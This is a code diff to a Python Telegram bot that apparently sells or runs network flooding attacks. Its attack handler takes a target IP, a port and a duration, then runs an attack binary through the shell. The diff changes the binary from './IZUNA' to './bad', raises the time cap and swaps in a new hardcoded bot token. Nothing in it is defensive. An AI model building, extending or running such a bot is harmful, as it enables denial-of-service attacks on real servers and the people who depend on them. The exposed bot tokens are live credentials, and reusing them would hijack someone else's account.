@@ -6,7 +6,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7817888758:AAEPZFAEtc-zlp4FOb4VDwwzt5k-faKzTHQ')
+bot = telebot.TeleBot('7922125334:AAFrF9FEsEb-yesEmvrhgT7eV5XJl0X7hVM')
 
 # Admin user IDs
 admin_id = {"7646520243"}
@@ -292,8 +292,8 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 240:
-                response = "Error: Time interval must be less than 240"
+            if time > 243:
+                response = "Error: Time interval must be less than 243"
             else:
                 attack_running = True  # Set the attack state to running
                 try:
@@ -302,7 +302,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./IZUNA {target} {port} {time} 1 900"
+                    full_command = f"./bad {target} {port} {time} 200 240 600 16"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
